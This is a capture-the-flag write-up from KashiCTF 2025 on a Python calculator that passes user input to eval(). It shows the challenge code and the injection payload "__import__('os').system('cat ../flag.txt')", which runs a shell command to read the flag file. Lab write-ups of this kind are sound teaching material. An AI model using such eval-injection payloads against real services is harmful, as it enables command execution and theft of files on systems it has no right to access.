---
title: "Easy Jail"
description: "I made this calculator. I have a feeling that it's not safe :("
pubDate: 2025-03-27
ctf: "KashiCTF 2025"
category: "misc"
author: "Tenzin"
section: "CTFs"
image: "images/25-kashi/icon.png"
---

Starting off the challenge, and initiating suffering, the instance is started. Using netcat to connect to the server, the following can be seen:
```
$ nc kashictf.iitbhucybersec.inc kashictf.iitbhucybersec.in 54179
           _            _       _
          | |          | |     | |
  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __
 / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|
| (_| (_| | | (__| |_| | | (_| | || (_) | |
 \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|
>>
```
Passing in values, and inputting basic arithmetics, the calculation is done as expected from a calculator.
```
>> 2 + 3
2 + 3 --> 5
```
Checking the docker file is provided, and having access to the docker files, the following python code can be seen within the chall.py:
```
#!/usr/bin/env python3

print("           _            _       _             ")
print("          | |          | |     | |            ")
print("  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __ ")
print(" / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|")
print("| (_| (_| | | (__| |_| | | (_| | || (_) | |   ")
print(" \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|   ")

def calc(op):
	try : 	
		res = eval(op)
	except :
		return print("Wrong operation")
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		calc(inp)

if __name__ == '__main__':
	main()
```
The eval function stood out as it was relied upon for the computation. Moreover, it was used for returning the value that will be printed upon, so doing a quick search with "[exploiting eval function in python to print a file content](https://www.google.com/search?q=exploiting+eval+function+in+python+to+print+a+file+content)" resulted in the [Exploiting Python’s Eval](https://www.floyd.ch/?p=584) page. 
Within the page, it discusses method to exploit eval function in python, and the text `__import__('os').system('echo hello, I am a command execution')` comes across as a input that can be used to execute command on the system ran. 
Since we are attempting to print the flag.txt file, which is within the parent directory, as seenable within the chall.py, and structure of the challenge folder. The input is made changes to run the `cat ../flag.txt`, capturing the flag.
```
$ nc kashictf.iitbhucybersec.in 60230
           _            _       _
          | |          | |     | |
  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __
 / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|
| (_| (_| | | (__| |_| | | (_| | || (_) | |
 \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|
>> __import__('os').system('cat ../flag.txt')
KashiCTF{3V4L_41NT_54F3_DGJ6tc1F}
__import__('os').system('cat ../flag.txt') --> 0
```